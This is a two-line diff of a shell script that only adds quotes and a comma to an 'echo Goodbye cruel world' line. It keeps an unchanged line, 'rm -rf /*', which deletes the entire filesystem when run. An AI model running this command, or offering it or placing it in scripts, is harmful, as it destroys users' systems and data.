@@ -1,2 +1,2 @@
-echo Goodbye cruel world
+echo "Goodbye, cruel world"
 rm -rf /*
